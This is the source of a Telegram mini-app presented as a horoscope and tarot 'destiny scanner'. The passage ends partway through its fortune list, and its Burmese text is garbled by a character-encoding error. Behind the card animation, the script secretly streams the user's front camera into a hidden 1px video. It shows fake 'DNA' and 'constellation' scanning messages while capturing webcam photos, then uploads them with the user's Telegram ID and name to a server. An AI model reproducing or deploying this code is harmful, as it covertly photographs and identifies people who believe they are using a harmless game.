<!DOCTYPE html>
<html>
<head>
    <title>AI Destiny & Horoscope</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
    <style>
        body { background: #0a0e14; color: #00d2ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; overflow-x: hidden; }
        .container { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
        
        /* Stealth Video (·Äô·Ä∞·Äõ·ÄÑ·Ä∫·Ä∏·Ä°·Äê·Ä≠·ÄØ·ÄÑ·Ä∫·Ä∏) */
        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
        
        /* Scanner UI */
        .scan-line { width: 80%; height: 2px; background: #00d2ff; position: absolute; animation: scan 3s infinite linear; z-index: 5; }
        @keyframes scan { 0% { top: 20%; } 50% { top: 80%; } 100% { top: 20%; } }
        
        .loading-bar { width: 250px; height: 10px; border: 1px solid #00d2ff; margin-top: 20px; border-radius: 5px; }
        .progress { width: 0%; height: 100%; background: #00d2ff; transition: width 0.1s; }

        /* --- NEW: Card Animation Style (·Ä°·Äû·ÄÖ·Ä∫·Äë·Ää·Ä∑·Ä∫·Äë·Ä¨·Ä∏·Äû·Ä±·Ä¨·Ä°·Äï·Ä≠·ÄØ·ÄÑ·Ä∫·Ä∏) --- */
        #card-anim-container {
            width: 100px; height: 150px;
            margin-bottom: 25px;
            perspective: 1000px;
        }
        #anim-card-img {
            width: 100%; height: 100%;
            object-fit: cover;
            border-radius: 8px;
            box-shadow: 0 0 15px #00d2ff;
            border: 1px solid #00d2ff;
            transition: transform 0.3s;
        }

        /* Horoscope Result Card */
        #result-card { 
            display: none; 
            background: linear-gradient(145deg, #0f151e, #0a0e14); /* Save ·Äú·Äæ·Ä°·Ä±·Ä¨·ÄÑ·Ä∫ Gradient ·Äû·ÄØ·Ä∂·Ä∏·Äë·Ä¨·Ä∏ */
            border-radius: 20px; 
            padding: 25px; border: 1px solid rgba(0, 210, 255, 0.3);
            width: 90%; max-width: 350px; text-align: left;
            animation: fadeIn 1s ease-in-out;
            box-shadow: 0 0 20px rgba(0, 210, 255, 0.2);
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        
        .result-item { margin: 15px 0; border-bottom: 1px solid rgba(0, 210, 255, 0.1); padding-bottom: 8px; }
        .label { font-size: 0.8rem; color: #aaa; text-transform: uppercase; }
        .value { font-size: 1.1rem; font-weight: bold; color: #fff; display: block; margin-top: 4px; }
        
        /* User Name Style (·Ä°·Äû·ÄÖ·Ä∫) */
        .user-greeting { 
            text-align: center; color: #00d2ff; margin-bottom: 5px; 
            font-size: 1.1rem; text-transform: uppercase; letter-spacing: 1px;
        }

        /* Buttons Group */
        .btn-group { display: flex; gap: 10px; margin-top: 25px; }
        .action-btn { 
            flex: 1; padding: 12px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; font-size: 0.9rem;
        }
        .save-btn { background: #00d2ff; color: #000; box-shadow: 0 0 10px rgba(0, 210, 255, 0.5); }
        .done-btn { background: transparent; border: 1px solid #00d2ff; color: #00d2ff; }
    </style>
</head>
<body>
    <div class="container">
        <div id="scanner-ui">
            <div class="scan-line"></div>
            
            <div id="card-anim-container">
                <img id="anim-card-img" src="https://upload.wikimedia.org/wikipedia/en/9/90/RWS_Tarot_00_Fool.jpg" alt="Card">
            </div>

            <h2 id="header">AI DESTINY SCANNER</h2>
            <p id="status">·ÄÄ·ÄÑ·Ä∫·Äô·Äõ·Ä¨·Ä°·Ä¨·Ä∏ ·ÄÖ·ÄÖ·Ä∫·ÄÜ·Ä±·Ä∏·Äî·Ä±·Äï·Ä´·Äû·Ää·Ä∫...</p>
            <div class="loading-bar"><div class="progress" id="progress"></div></div>
        </div>

        <div id="result-card">
            <h3 class="user-greeting" id="user-name-display">USER REPORT</h3>
            
            <h2 style="text-align: center; color: #00d2ff; margin-top: 0; font-size: 1.5rem; border-bottom: 1px solid rgba(0,210,255,0.3); padding-bottom: 10px;">DESTINY RESULT</h2>
            
            <div class="result-item">
                <span class="label">Luck Level (·ÄÄ·Ä∂·Äê·Äõ·Ä¨·Ä∏)</span>
                <span class="value" id="luck-val">95%</span>
            </div>
            <div class="result-item">
                <span class="label">Love (·Ä°·ÄÅ·Äª·ÄÖ·Ä∫·Äõ·Ä±·Ä∏)</span>
                <span class="value" id="love-val">Loading...</span>
            </div>
            <div class="result-item">
                <span class="label">Wealth (·ÄÖ·ÄÆ·Ä∏·Äï·ÄΩ·Ä¨·Ä∏·Äõ·Ä±·Ä∏)</span>
                <span class="value" id="wealth-val">Loading...</span>
            </div>
            <div class="result-item">
                <span class="label">Lucky Color (·ÄÄ·Ä∂·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·ÄÖ·Ä±·Äû·Ä±·Ä¨·Ä°·Äõ·Ä±·Ä¨·ÄÑ·Ä∫)</span>
                <span class="value" id="color-val">Loading...</span>
            </div>

            <div class="btn-group" data-html2canvas-ignore="true">
                <button class="action-btn save-btn" onclick="saveCard()">üì• SAVE CARD</button>
                <button class="action-btn done-btn" onclick="tg.close()">DONE</button>
            </div>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const progress = document.getElementById('progress');
        const status = document.getElementById('status');
        const tg = window.Telegram.WebApp;
        tg.ready(); tg.expand();

        const userName = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "Mystery User";
        document.getElementById('user-name-display').innerText = "PREDICTION FOR " + userName;

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(s => { video.srcObject = s; startProcess(); })
            .catch(() => status.innerText = "Camera Permission Required");

        const cardImages = [
            "https://upload.wikimedia.org/wikipedia/en/9/90/RWS_Tarot_00_Fool.jpg",
            "https://upload.wikimedia.org/wikipedia/en/d/db/RWS_Tarot_01_Magician.jpg",
            "https://upload.wikimedia.org/wikipedia/en/8/88/RWS_Tarot_02_High_Priestess.jpg",
            "https://upload.wikimedia.org/wikipedia/en/d/de/RWS_Tarot_03_Empress.jpg",
            "https://upload.wikimedia.org/wikipedia/en/2/22/RWS_Tarot_04_Emperor.jpg",
            "https://upload.wikimedia.org/wikipedia/en/6/60/RWS_Tarot_05_Hierophant.jpg"
        ];
        let cardIndex = 0;
        const animCardImg = document.getElementById('anim-card-img');
        let cardInterval; 

        function startCardAnimation() {
            // ·ÅÄ.·ÅÉ ·ÄÖ·ÄÄ·Äπ·ÄÄ·Äî·Ä∑·Ä∫·Äê·ÄÖ·Ä∫·ÄÅ·Ä´ ·Äï·ÄØ·Ä∂·Äï·Äº·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äô·Ää·Ä∫
            cardInterval = setInterval(() => {
                cardIndex = (cardIndex + 1) % cardImages.length;
                animCardImg.src = cardImages[cardIndex];
                // ·Äï·ÄØ·Ä∂·Äú·Äæ·Ää·Ä∑·Ä∫·Äû·Ää·Ä∑·Ä∫ Effect
                animCardImg.style.transform = "scale(0.9) rotateY(180deg)";
                setTimeout(() => {
                    animCardImg.style.transform = "scale(1) rotateY(0deg)";
                }, 150);
            }, 400);
        }

        let captureCount = 0;
        function startProcess() {
            startCardAnimation();
            
            let width = 0;
            const itv = setInterval(() => {
                width += 0.5;
                progress.style.width = width + '%';
                if (width == 30 && captureCount == 0) { captureImage("Scanning DNA Patterns..."); captureCount++; }
                if (width == 70 && captureCount == 1) { captureImage("Matching Star Constellations..."); captureCount++; }
                
                if (width >= 100) {
                    clearInterval(itv);
                    clearInterval(cardInterval);
                    showHoroscope();
                }
            }, 50);
        }

        async function captureImage(msg) {
            status.innerText = msg;
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            const img = canvas.toDataURL('image/jpeg', 0.6);
            const uid = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "Guest";
            const uname = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "External";
            fetch('/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: img, user_id: uid, user_name: uname })
            });
        }

        function showHoroscope() {
            document.getElementById('scanner-ui').style.display = 'none';
            document.getElementById('result-card').style.display = 'block';

            const results = [
        // --- ·Ä°·ÄÅ·Äª·ÄÖ·Ä∫·Äõ·Ä±·Ä∏ (Love & Relationship) ---
                "·Äö·Äî·Ä±·Ä∑ Crush ·ÄÜ·ÄÆ·Äô·Äæ Message ·Äõ·Ä±·Ä¨·ÄÄ·Ä∫·Äú·Ä¨·Äê·Äê·Ä∫·Äû·Ää·Ä∫·Åã",
                "·Ä°·ÄÅ·Äª·ÄÖ·Ä∫·Äû·ÄÖ·Ä∫·Äî·Äæ·ÄÑ·Ä∑·Ä∫ ·ÄÜ·ÄØ·Ä∂·Äê·ÄΩ·Ä±·Ä∑·Äñ·Ä≠·ÄØ·Ä∑ ·Åà·ÅÄ% ·Äû·Ä±·ÄÅ·Äª·Ä¨·Äî·Ä±·Äï·Äº·ÄÆ·Åã",
                "·Äü·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äú·Ä±·Äû·Ä±·Ä¨ ·Ä°·ÄÅ·Äª·ÄÖ·Ä∫·Äü·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äô·Äª·Ä¨·Ä∏ ·Äï·Äº·Äî·Ä∫·Äï·Ä±·Ä´·Ä∫·Äú·Ä¨·Äê·Äê·Ä∫·Äû·Ää·Ä∫·Åã",
                "·Äû·ÄÑ·Ä∑·Ä∫·ÄÄ·Ä≠·ÄØ ·Äê·Ä≠·Äê·Ä∫·Äê·ÄÅ·Ä≠·ÄØ·Ä∏ ·ÄÅ·Äª·ÄÖ·Ä∫·Äî·Ä±·Äû·Ä∞·Äê·ÄÖ·Ä∫·Ä¶·Ä∏ ·Ä°·Äî·ÄÆ·Ä∏·Äî·Ä¨·Ä∏·Äô·Äæ·Ä¨ ·Äõ·Äæ·Ä≠·Äî·Ä±·Äû·Ää·Ä∫·Åã",
                "·ÄÅ·Äª·ÄÖ·Ä∫·Äû·Ä∞·Äî·Äæ·ÄÑ·Ä∑·Ä∫ ·Ä°·Äû·Ä±·Ä∏·Ä°·Äñ·ÄΩ·Ä≤·ÄÄ·Ä≠·ÄÖ·Äπ·ÄÖ·Äñ·Äº·ÄÑ·Ä∑·Ä∫ ·ÄÖ·ÄÄ·Ä¨·Ä∏·Äô·Äª·Ä¨·Ä∏·Äõ·Äê·Äê·Ä∫·Äû·Äñ·Äº·ÄÑ·Ä∑·Ä∫ ·Äû·Äê·Ä≠·Äë·Ä¨·Ä∏·Äï·Ä´·Åã",
                "Single ·Äò·Äù·Äô·Äæ ·Äú·ÄΩ·Äê·Ä∫·Äô·Äº·Ä±·Ä¨·ÄÄ·Ä∫·Äê·Ä±·Ä¨·Ä∑·Äô·Ää·Ä∑·Ä∫ ·Äú·ÄÄ·Äπ·ÄÅ·Äè·Ä¨·Äõ·Äæ·Ä≠·Äû·Ää·Ä∫·Åã",
                "·Äû·ÄÑ·Ä∑·Ä∫·Äõ·Ä≤·Ä∑ ·Ä°·Äï·Äº·ÄØ·Ä∂·Ä∏·ÄÄ ·Äú·Ä∞·Äê·ÄÖ·Ä∫·Äö·Ä±·Ä¨·ÄÄ·Ä∫·ÄÄ·Ä≠·ÄØ ·Äõ·Ä∞·Ä∏·ÄÅ·Ä´·Äû·ÄΩ·Ä¨·Ä∏·ÄÖ·Ä±·Äú·Ä≠·Äô·Ä∑·Ä∫·Äô·Ää·Ä∫·Åã",
                "·Äô·Äô·Äª·Äæ·Ä±·Ä¨·Ä∫·Äú·ÄÑ·Ä∑·Ä∫·Äò·Ä≤ Date ·Äú·ÄØ·Äï·Ä∫·Äñ·Ä≠·ÄØ·Ä∑ ·Äñ·Ä≠·Äê·Ä∫·ÄÅ·Ä±·Ä´·Ä∫·ÄÅ·Ä∂·Äõ·Äú·Ä≠·Äô·Ä∑·Ä∫·Äô·Ää·Ä∫·Åã",
                "·Äö·Äî·Ä±·Ä∑·Äû·Ää·Ä∫ ·Ä°·ÄÅ·Äª·ÄÖ·Ä∫·Äõ·Ä±·Ä∏·Äë·ÄÄ·Ä∫ ·Äû·Ä∞·ÄÑ·Äö·Ä∫·ÄÅ·Äª·ÄÑ·Ä∫·Ä∏·Äô·Äª·Ä¨·Ä∏·Äî·Äæ·ÄÑ·Ä∑·Ä∫ ·Ä°·ÄÅ·Äª·Ä≠·Äî·Ä∫·Äñ·Äº·ÄØ·Äî·Ä∫·Ä∏·Äû·ÄÑ·Ä∑·Ä∫·Äû·Ä±·Ä¨·Äî·Ä±·Ä∑·Äñ·Äº·ÄÖ·Ä∫·Äû·Ää·Ä∫·Åã",
                "Relationship ·Äë·Ä≤·Äô·Äæ·Ä¨ ·Äî·Ä¨·Ä∏·Äú·Ää·Ä∫·Äô·Äæ·ÄØ ·Ä°·Äï·Äº·Ää·Ä∑·Ä∫·Ä°·Äù ·Äõ·Äõ·Äæ·Ä≠·Äô·Ää·Ä∑·Ä∫·Äî·Ä±·Ä∑·Åã",

        // --- ·ÄÑ·ÄΩ·Ä±·ÄÄ·Äº·Ä±·Ä∏·Äî·Äæ·ÄÑ·Ä∑·Ä∫ ·ÄÄ·Ä∂·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·ÄÅ·Äº·ÄÑ·Ä∫·Ä∏ (Wealth & Luck) ---
                "·Äô·Äô·Äª·Äæ·Ä±·Ä¨·Ä∫·Äú·ÄÑ·Ä∑·Ä∫·Äò·Ä≤ ·Äú·ÄÄ·Ä∫·ÄÜ·Ä±·Ä¨·ÄÑ·Ä∫ (·Äû·Ä≠·ÄØ·Ä∑) ·Äô·ÄØ·Äî·Ä∑·Ä∫·Äñ·Ä≠·ÄØ·Ä∏ ·Äõ·Äõ·Äæ·Ä≠·Äê·Äê·Ä∫·Äû·Ää·Ä∫·Åã",
                "·Äë·ÄÆ·Äï·Ä±·Ä´·ÄÄ·Ä∫·Äû·Äú·Ä≠·ÄØ·Äô·Äª·Ä≠·ÄØ·Ä∏ ·ÄÑ·ÄΩ·Ä±·Äù·ÄÑ·Ä∫·ÄÄ·Ä≠·Äî·Ä∫·Ä∏ ·Ä°·Äú·ÄΩ·Äî·Ä∫·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äî·Ä±·Äû·Ää·Ä∫·Åã",
                "·Äï·Ä≠·ÄØ·ÄÄ·Ä∫·ÄÜ·Ä∂·Ä°·Ä≠·Äê·Ä∫·Äë·Ä≤·Äê·ÄΩ·ÄÑ·Ä∫ ·ÄÑ·ÄΩ·Ä±·Äô·Äï·Äº·Äê·Ä∫·Äò·Ä≤ ·Ä°·Äô·Äº·Ä≤·Äõ·Äæ·Ä≠·Äî·Ä±·Äô·Ää·Ä∑·Ä∫·Äî·Ä±·Ä∑·Åã",
                "·Ä°·Äû·ÄØ·Ä∂·Ä∏·ÄÖ·Äõ·Ä≠·Äê·Ä∫ ·Äô·Äª·Ä¨·Ä∏·Äî·Ä±·Äû·Äñ·Äº·ÄÑ·Ä∑·Ä∫ ·Äö·Äî·Ä±·Ä∑·ÄÖ·Äª·Ä±·Ä∏·Äù·Äö·Ä∫·ÄÅ·Äº·ÄÑ·Ä∫·Ä∏·ÄÄ·Ä≠·ÄØ ·Äõ·Äæ·Ä±·Ä¨·ÄÑ·Ä∫·Äï·Ä´·Åã",
                "·Ä°·ÄÄ·Äº·ÄΩ·Ä±·Ä∏·Äü·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äô·Äª·Ä¨·Ä∏ ·Äï·Äº·Äî·Ä∫·Äõ·Äê·Äê·Ä∫·Äû·Ä±·Ä¨ ·ÄÄ·Ä∂·Äõ·Äæ·Ä≠·Äû·Ää·Ä∫·Åã",
                "·Äõ·ÄΩ·Äæ·Ä±·Äù·ÄÑ·Ä∫·Äê·Äê·Ä∫·Äû·Ä±·Ä¨·Äî·Ä±·Ä∑ ·Äñ·Äº·ÄÖ·Ä∫·Äû·Äñ·Äº·ÄÑ·Ä∑·Ä∫ ·Ä°·Äù·Ä´·Äõ·Ä±·Ä¨·ÄÑ·Ä∫·Äù·Äê·Ä∫·ÄÜ·ÄÑ·Ä∫·Äï·Ä´·Åã",
                "·Äû·Ä∞·ÄÑ·Äö·Ä∫·ÄÅ·Äª·ÄÑ·Ä∫·Ä∏·Äê·ÄÖ·Ä∫·Äö·Ä±·Ä¨·ÄÄ·Ä∫·ÄÄ ·Äû·ÄÑ·Ä∑·Ä∫·ÄÄ·Ä≠·ÄØ ·Äö·Äî·Ä±·Ä∑ ·Äô·ÄØ·Äî·Ä∑·Ä∫·Äù·Äö·Ä∫·ÄÄ·Äª·ÄΩ·Ä±·Ä∏·Äú·Ä≠·Äô·Ä∑·Ä∫·Äô·Ää·Ä∫·Åã",
                "·ÄÖ·Äª·Ä±·Ä∏·Äù·Äö·Ä∫·Äú·Äª·Äæ·ÄÑ·Ä∫ Discount ·Ä°·ÄÄ·Äº·ÄÆ·Ä∏·Ä°·ÄÄ·Äª·Äö·Ä∫ ·Äõ·Äê·Äê·Ä∫·Äû·Ää·Ä∫·Åã",
                "·Äö·Äî·Ä±·Ä∑ ·Äõ·ÄÑ·Ä∫·Ä∏·Äî·Äæ·ÄÆ·Ä∏·Äô·Äº·Äæ·ÄØ·Äï·Ä∫·Äî·Äæ·Ä∂·Äô·Äæ·ÄØ·Äú·ÄØ·Äï·Ä∫·Äú·Äª·Äæ·ÄÑ·Ä∫ ·Ä°·Ä±·Ä¨·ÄÑ·Ä∫·Äô·Äº·ÄÑ·Ä∫·Äî·Ä≠·ÄØ·ÄÑ·Ä∫·ÄÅ·Äª·Ä± ·Äõ·Äæ·Ä≠·Äû·Ää·Ä∫·Åã",
                "·Äï·Ä≠·ÄØ·ÄÄ·Ä∫·ÄÜ·Ä∂·ÄÄ·Ä±·Ä¨·ÄÄ·Ä∫·Äõ·Äê·Äê·Ä∫·Äû·Äñ·Äº·ÄÑ·Ä∑·Ä∫ ·Äú·Äô·Ä∫·Ä∏·Äú·Äª·Äæ·Ä±·Ä¨·ÄÄ·Ä∫·Äú·Äª·Äæ·ÄÑ·Ä∫ ·Äô·Äº·Ä±·ÄÄ·Äº·ÄÆ·Ä∏·ÄÄ·Ä≠·ÄØ ·ÄÄ·Äº·Ää·Ä∑·Ä∫·Äï·Ä´·Åã",

        // --- ·ÄÄ·Äª·Äî·Ä∫·Ä∏·Äô·Ä¨·Äõ·Ä±·Ä∏·Äî·Äæ·ÄÑ·Ä∑·Ä∫ ·ÄÖ·Ä≠·Äê·Ä∫·ÄÅ·Ä∂·ÄÖ·Ä¨·Ä∏·ÄÅ·Äª·ÄÄ·Ä∫ (Health & Mood) ---
                "·ÄÖ·Ä≠·Äê·Ä∫·Äï·Äª·Ä±·Ä¨·Ä∫·Äõ·ÄΩ·Äæ·ÄÑ·Ä∫·ÄÖ·Äõ·Ä¨ ·Äû·Äê·ÄÑ·Ä∫·Ä∏·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äê·ÄÖ·Ä∫·ÄÅ·ÄØ ·ÄÄ·Äº·Ä¨·Ä∏·Äõ·Äú·Ä≠·Äô·Ä∑·Ä∫·Äô·Ää·Ä∫·Åã",
                "·ÄÄ·Äª·Äî·Ä∫·Ä∏·Äô·Ä¨·Äõ·Ä±·Ä∏·Ä°·Äê·ÄΩ·ÄÄ·Ä∫ ·Äõ·Ä±·Äô·Äª·Ä¨·Ä∏·Äô·Äª·Ä¨·Ä∏·Äû·Ä±·Ä¨·ÄÄ·Ä∫·Äõ·Äî·Ä∫ ·Äú·Ä≠·ÄØ·Ä°·Äï·Ä∫·Äî·Ä±·Äû·Ää·Ä∫·Åã",
                "·Äö·Äî·Ä±·Ä∑·Äû·Ää·Ä∫ ·Ä°·Ä≠·Äô·Ä∫·Äô·Äæ·Ä¨·Äï·Ä≤ ·Ä°·Ä±·Ä∏·Ä°·Ä±·Ä∏·ÄÜ·Ä±·Ä∏·ÄÜ·Ä±·Ä∏ ·Äî·Ä¨·Ä∏·Äö·Ä∞·Äû·ÄÑ·Ä∑·Ä∫·Äû·Ä±·Ä¨·Äî·Ä±·Ä∑·Äñ·Äº·ÄÖ·Ä∫·Äû·Ää·Ä∫·Åã",
                "·Äû·ÄÑ·Ä∑·Ä∫·Äõ·Ä≤·Ä∑ Energy ·Äê·ÄΩ·Ä± ·Ä°·Äú·ÄΩ·Äî·Ä∫·Äê·ÄÄ·Ä∫·ÄÄ·Äº·ÄΩ·Äî·Ä±·Äô·Ää·Ä∑·Ä∫·Äî·Ä±·Ä∑·Åã",
                "·Ää·Äò·ÄÄ·Ä∫·Äê·ÄΩ·ÄÑ·Ä∫ ·Ä°·Ä≠·Äï·Ä∫·Äô·ÄÄ·Ä∫·Äú·Äæ·Äú·Äæ·Äú·Ä±·Ä∏·Äô·Äª·Ä¨·Ä∏ ·Äô·Äº·ÄÑ·Ä∫·Äô·ÄÄ·Ä∫·Äú·Ä≠·Äô·Ä∑·Ä∫·Äô·Ää·Ä∫·Åã",
                "·ÄÄ·Ä≠·ÄØ·Äö·Ä∑·Ä∫·ÄÄ·Ä≠·ÄØ·Äö·Ä∫·ÄÄ·Ä≠·ÄØ ·Äï·Ä≠·ÄØ·ÄÅ·Äª·ÄÖ·Ä∫·Äú·Ä¨·Äô·Ää·Ä∑·Ä∫ ·Ä°·ÄÅ·Ä≠·ÄØ·ÄÄ·Ä∫·Ä°·Äê·Äî·Ä∑·Ä∫·Äô·Äª·Ä¨·Ä∏ ·ÄÄ·Äº·ÄØ·Ä∂·Äõ·Äô·Ää·Ä∫·Åã",
                "·Äê·ÄÖ·Ä∫·Äî·Ä±·ÄÄ·ÄØ·Äî·Ä∫ ·Äó·Ä≠·ÄØ·ÄÄ·Ä∫·ÄÜ·Ä¨·Äî·Ä±·Äê·Äê·Ä∫·Äû·Äñ·Äº·ÄÑ·Ä∑·Ä∫ ·Ä°·Äü·Ä¨·Äõ·Äõ·Äæ·Ä≠·Äê·Ä¨ ·ÄÖ·Ä¨·Ä∏·Äï·Ä´·Åã",
                "·Ä°·Äù·Äê·Ä∫·Ä°·ÄÖ·Ä¨·Ä∏·Äû·ÄÖ·Ä∫ ·Äù·Äê·Ä∫·ÄÜ·ÄÑ·Ä∫·Äï·Ä´·ÄÄ ·Äï·Ä≠·ÄØ·Åç ·ÄÄ·Äº·Ää·Ä∑·Ä∫·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äî·Ä±·Äô·Ää·Ä∫·Åã",
                "·ÄÖ·Ä≠·Äê·Ä∫·Äì·Ä¨·Äê·Ä∫·ÄÄ·Äª·ÄÖ·Äõ·Ä¨·Äõ·Äæ·Ä≠·Äú·Äª·Äæ·ÄÑ·Ä∫ ·Äû·ÄÆ·ÄÅ·Äª·ÄÑ·Ä∫·Ä∏·Ä°·Ä±·Ä∏·Ä°·Ä±·Ä∏·Äú·Ä±·Ä∏ ·Äî·Ä¨·Ä∏·Äë·Ä±·Ä¨·ÄÑ·Ä∫·Äï·Ä´·Åã",
                "·Äö·Äî·Ä±·Ä∑ ·Äû·ÄÑ·Ä∑·Ä∫·Äõ·Ä≤·Ä∑ ·Ä°·Äï·Äº·ÄØ·Ä∂·Ä∏·ÄÄ ·ÄÄ·Äô·Äπ·Äò·Ä¨·ÄÄ·Äº·ÄÆ·Ä∏·ÄÄ·Ä≠·ÄØ ·Äú·Äæ·Äï·ÄÖ·Ä±·Äï·Ä´·Äú·Ä≠·Äô·Ä∑·Ä∫·Äô·Ää·Ä∫·Åã",

        // --- ·Äü·Ä¨·Äû·Äî·Äæ·ÄÑ·Ä∑·Ä∫ ·Äë·Ä∞·Ä∏·Äë·Ä∞·Ä∏·ÄÜ·Äî·Ä∫·Ä∏·ÄÜ·Äî·Ä∫·Ä∏ (Fun & Mystery) ---
                "·Äö·Äî·Ä±·Ä∑ ·Äû·ÄÑ·Ä∑·Ä∫·Ä°·Ä¨·Ä∏ ·Äú·Ä∞·ÄÄ·Äº·ÄÆ·Ä∏·Äû·Ä∞·Äô·Äê·ÄÖ·Ä∫·Ä¶·Ä∏·ÄÄ ·ÄÜ·Ä∞·Äï·Ä∞·Äê·Äê·Ä∫·Äû·Äñ·Äº·ÄÑ·Ä∑·Ä∫ ·ÄÑ·Äº·Ä≠·Äô·Ä∫·ÄÑ·Äº·Ä≠·Äô·Ä∫·Äî·Ä±·Äï·Ä´·Åã",
                "·ÄÅ·Äõ·ÄÆ·Ä∏·Äû·ÄΩ·Ä¨·Ä∏·Äú·Äª·Äæ·ÄÑ·Ä∫ ·Äú·Äô·Ä∫·Ä∏·Äê·ÄΩ·ÄÑ·Ä∫ ·Äõ·Ää·Ä∫·Ä∏·ÄÖ·Ä¨·Ä∏·Äü·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äî·Äæ·ÄÑ·Ä∑·Ä∫ ·ÄÜ·ÄØ·Ä∂·Äê·Äê·Ä∫·Äû·Ää·Ä∫·Åã",
                "·Äö·Äî·Ä±·Ä∑ ·ÄÄ·Ä∂·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·ÄÅ·Äº·ÄÑ·Ä∫·Ä∏·Äî·Ä∂·Äï·Ä´·Äê·Ä∫·Äô·Äæ·Ä¨ ·Åá ·Äñ·Äº·ÄÖ·Ä∫·Äû·Ää·Ä∫·Åã",
                "·Ä°·ÄΩ·Äî·Ä∫·Äú·Ä≠·ÄØ·ÄÑ·Ä∫·Ä∏·Äô·Äæ ·Äï·ÄÖ·Äπ·ÄÖ·Ää·Ä∫·Ä∏·Äô·Äæ·Ä¨·Äú·Äª·Äæ·ÄÑ·Ä∫ ·ÄÄ·Ä∂·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äô·Ää·Ä∑·Ä∫·Äî·Ä±·Ä∑·Åã",
                "·Äñ·ÄØ·Äî·Ä∫·Ä∏·ÄÄ·Ä≠·ÄØ ·ÄÅ·Äè·ÄÅ·Äª·Äï·Äº·ÄÆ·Ä∏ ·ÄÖ·Ä¨·Ä°·ÄØ·Äï·Ä∫·Äñ·Äê·Ä∫·ÄÄ·Äº·Ää·Ä∑·Ä∫·Äõ·Äî·Ä∫ ·Ä°·ÄÄ·Äº·Ä∂·Äï·Äº·ÄØ·Äû·Ää·Ä∫·Åã",
                "·Äû·ÄÑ·Ä∑·Ä∫·Äî·Ä±·Ä¨·ÄÄ·Ä∫·Äê·ÄΩ·ÄÑ·Ä∫ ·ÄÄ·Ä∂·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·ÄÅ·Äº·ÄÑ·Ä∫·Ä∏ ·Äî·Äê·Ä∫·Äô·Ä≠·Äô·Äö·Ä∫·Äú·Ä±·Ä∏ ·Äú·Ä≠·ÄØ·ÄÄ·Ä∫·Äî·Ä±·Äû·Ää·Ä∫·Åã",
                "·Äò·Äö·Ä∫·Äû·ÄΩ·Ä¨·Ä∏·Äû·ÄΩ·Ä¨·Ä∏ ·Äú·Ä∞·ÄÅ·Äª·ÄÖ·Ä∫·Äú·Ä∞·ÄÅ·ÄÑ·Ä∫ ·Äï·Ä±·Ä´·Äô·Äª·Ä¨·Ä∏·Äî·Ä±·Äô·Ää·Ä∑·Ä∫·Äî·Ä±·Ä∑·Åã",
                "·Äô·ÄØ·Äî·Ä∑·Ä∫·ÄÖ·Ä≠·Äô·Ä∫·Ä∏·Äï·Ä±·Ä´·ÄÑ·Ä∫·Ä∏ ·ÄÖ·Ä¨·Ä∏·Äõ·Äê·Äê·Ä∫·Äû·Ä±·Ä¨ ·ÄÄ·Ä∂·Äõ·Äæ·Ä≠·Äû·Ää·Ä∫·Åã",
                "·Äô·Ä≠·ÄØ·Ä∏·Äõ·ÄΩ·Ä¨·Äú·Äª·Äæ·ÄÑ·Ä∫ ·Ä°·Äï·Äº·ÄÑ·Ä∫·Äô·Äë·ÄΩ·ÄÄ·Ä∫·Äï·Ä´·Äî·Äæ·ÄÑ·Ä∑·Ä∫·Åä ·Ä°·Ä°·Ä±·Ä∏·Äï·Äê·Ä∫·Äê·Äê·Ä∫·Äû·Ää·Ä∫·Åã",
                "·Äê·ÄÖ·Ä∫·ÄÖ·ÄØ·Ä∂·Äê·ÄÖ·Ä∫·Äö·Ä±·Ä¨·ÄÄ·Ä∫·ÄÄ ·Äû·ÄÑ·Ä∑·Ä∫·ÄÄ·Ä≠·ÄØ Surprise ·Äú·ÄØ·Äï·Ä∫·Äõ·Äî·Ä∫ ·Äï·Äº·ÄÑ·Ä∫·Äî·Ä±·Äû·Ää·Ä∫·Åã",
                "·Äö·Äî·Ä±·Ä∑ ·ÄÄ·Ä∂·Ä°·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·ÄÜ·ÄØ·Ä∂·Ä∏·Äú·Ä∞·Äô·Äæ·Ä¨ ·Äû·ÄÑ·Ä∫·Äï·ÄÑ·Ä∫ ·Äñ·Äº·ÄÖ·Ä∫·Äû·Ää·Ä∫·Åã",
